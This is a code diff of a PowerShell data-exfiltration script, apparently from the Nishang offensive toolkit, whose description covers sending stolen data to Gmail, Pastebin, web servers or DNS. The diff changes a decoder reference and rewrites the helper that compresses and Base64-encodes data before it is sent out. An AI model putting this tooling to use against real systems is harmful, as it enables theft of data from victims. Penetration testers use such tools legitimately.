@@ -4,7 +4,7 @@ Use this script to exfiltrate data from a target.
 
 .DESCRIPTION
 This script could be used to exfiltrate data from a target to gmail, pastebin, a webserver which could log POST requests
-and a DNS Server which could log TXT queries. To decode the data exfiltrated by webserver and DNS methods use Decode.ps1 
+and a DNS Server which could log TXT queries. To decode the data exfiltrated by webserver and DNS methods use Invoke-Decode.ps1 
 in Utility folder of Nishang.
 
 .PARAMETER Data
@@ -107,16 +107,15 @@ function Do-Exfiltration
 
     function Compress-Encode
     {
-        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
-        $ms = New-Object IO.MemoryStream
-        $action = [IO.Compression.CompressionMode]::Compress
-        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
-        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
-        $Data | ForEach-Object {$sw.WriteLine($_)}
-        $sw.Close()
-        # Base64 encode stream
-        $lengthofsubstr = 0
-        $code = [Convert]::ToBase64String($ms.ToArray())
+        #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
+        $encdata = [string]::Join("`n", $Data)
+        $ms = New-Object System.IO.MemoryStream
+        $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
+        $sw = New-Object System.IO.StreamWriter($cs)
+        $sw.Write($encdata)
+        $sw.Close();
+        $Compressed = [Convert]::ToBase64String($ms.ToArray())
+        $Compressed
     }
 
     if ($exfiloption -eq "pastebin")
